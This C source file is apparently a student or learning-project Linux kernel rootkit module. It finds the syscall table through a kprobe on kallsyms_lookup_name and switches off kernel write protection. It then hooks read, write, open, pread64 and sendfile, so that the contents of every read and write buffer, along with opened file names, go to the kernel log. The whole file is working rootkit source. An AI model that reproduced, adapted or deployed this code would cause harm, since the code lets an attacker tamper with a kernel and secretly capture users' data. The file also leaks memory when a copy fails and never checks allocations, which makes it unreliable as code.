#include <linux/fs.h>
#include <linux/ioctl.h>
#include <linux/kprobes.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#include "rootkit-main.h"
#include "mem-protect.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
MODULE_DESCRIPTION("A Linux kernel rootkit");
MODULE_VERSION("0.1");

static unsigned long ul_orig_cr0;
static kallsyms_t lookup_name;
static uint64_t *p_syscall_table;
static sysfun_t orig_read;
static sysfun_t orig_write;
static sysfun_t orig_open;
static sysfun_t orig_pread64;
static sysfun_t orig_sendfile;
// static sysfun_t orig_readv;
// static sysfun_t orig_preadv;

static int __init rootkit_init(void)
{
	int i_err;

	// Declare what we need to find
	struct kprobe probe = {
		.symbol_name = "kallsyms_lookup_name",
	};

	i_err = register_kprobe(&probe);
	if (i_err) {
		pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.");

		return i_err;
	}

	// Function pointer type of kallsyms_lookup_name()
	lookup_name = (kallsyms_t)(probe.addr);

	// Cleanup kprobe as we don't need it anymore
	unregister_kprobe(&probe);

	// Find syscall table address
	p_syscall_table = lookup_name("sys_call_table");

	ul_orig_cr0 = unprotect_memory();

	orig_read = (sysfun_t)p_syscall_table[__NR_read];
	p_syscall_table[__NR_read] = (uint64_t)new_read;
	orig_write = (sysfun_t)p_syscall_table[__NR_write];
	p_syscall_table[__NR_write] = (uint64_t)new_write;
	orig_open = (sysfun_t)p_syscall_table[__NR_open];
	p_syscall_table[__NR_open] = (uint64_t)new_open;
	orig_pread64 = (sysfun_t)p_syscall_table[__NR_pread64];
	p_syscall_table[__NR_pread64] = (uint64_t)new_pread64;
	orig_sendfile = (sysfun_t)p_syscall_table[__NR_sendfile];
	p_syscall_table[__NR_sendfile] = (uint64_t)new_sendfile;

	protect_memory(ul_orig_cr0);

	pr_info("[ROOTKIT] Module loaded");
	pr_info("[ROOTKIT] kallsym_lookup_name() address: %p", lookup_name);
	pr_info("[ROOTKIT] Syscall table address: %p", p_syscall_table);
	return 0;
}

static __exit void rootkit_exit(void)
{
	// Restore original syscall functions
	ul_orig_cr0 = unprotect_memory();

	p_syscall_table[__NR_read] = (uint64_t)orig_read;
	p_syscall_table[__NR_write] = (uint64_t)orig_write;
	p_syscall_table[__NR_open] = (uint64_t)orig_open;
	p_syscall_table[__NR_pread64] = (uint64_t)orig_pread64;
	p_syscall_table[__NR_sendfile] = (uint64_t)orig_sendfile;

	protect_memory(ul_orig_cr0);

	pr_info("[ROOTKIT] Module unloaded");
	return;
}

long new_read(struct pt_regs *p_regs)
{
	unsigned int ui32_fd = (unsigned int)p_regs->di; // first parameter
	char __user *s_buf = (char __user *)p_regs->si; // second parameter
	size_t sz_count = (size_t)p_regs->dx; // third parameter

	long l_ret;
	char *s_data;

	pr_info("[ROOTKIT] read(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

	l_ret = orig_read(p_regs);

	s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

	if (copy_from_user(s_data, s_buf, sz_count)) {
		pr_err("[ROOTKIT] * Could not copy data from user");
	} else {
		s_data[sz_count] = '\0';
		pr_info("[ROOTKIT] * Data read: %s", s_data);
		kvfree(s_data);
	}

	return l_ret;
}

long new_write(struct pt_regs *p_regs)
{
	unsigned int ui32_fd = (unsigned int)p_regs->di;
	const char __user *s_buf = (const char __user *)p_regs->si;
	size_t sz_count = (size_t)p_regs->dx;

	char *s_data;

	pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

	s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

	if (copy_from_user(s_data, s_buf, sz_count)) {
		pr_err("[ROOTKIT] * Could not copy data from user");
	} else {
		s_data[sz_count] = '\0';
		pr_info("[ROOTKIT] * Data to write: %s", s_data);
		kvfree(s_data);
	}

	return orig_write(p_regs);
}

long new_open(struct pt_regs *p_regs)
{
	const char __user *s_filename = (const char *)p_regs->di;
	int i32_flags = (int)p_regs->si;
	umode_t ui16_mode = (umode_t)p_regs->dx;

	pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)", s_filename, i32_flags, ui16_mode);

	return orig_open(p_regs);
}

long new_pread64(struct pt_regs *p_regs)
{
	unsigned int ui32_fd = (unsigned int)p_regs->di;
	char __user *s_buf = (char __user *)p_regs->si;
	size_t sz_count = (size_t)p_regs->dx;
	loff_t i64_pos = (loff_t)p_regs->r10;

	long l_ret;
	char *s_data;

	pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);

	l_ret = orig_pread64(p_regs);

	s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

	if (copy_from_user(s_data, s_buf, sz_count)) {
		pr_err("[ROOTKIT] * Could not copy data from user");
	} else {
		s_data[sz_count] = '\0';
		pr_info("[ROOTKIT] * Data read: %s", s_data);
		kvfree(s_data);
	}

	return l_ret;
}

long new_sendfile(struct pt_regs *p_regs)
{
	int i32_out_fd = (int)p_regs->di;
	int i32_in_fd = (int)p_regs->si;
	loff_t __user *p_offset = (loff_t __user *)p_regs->dx;
	size_t sz_count = (size_t)p_regs->r10;

	pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);

	return orig_sendfile(p_regs);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
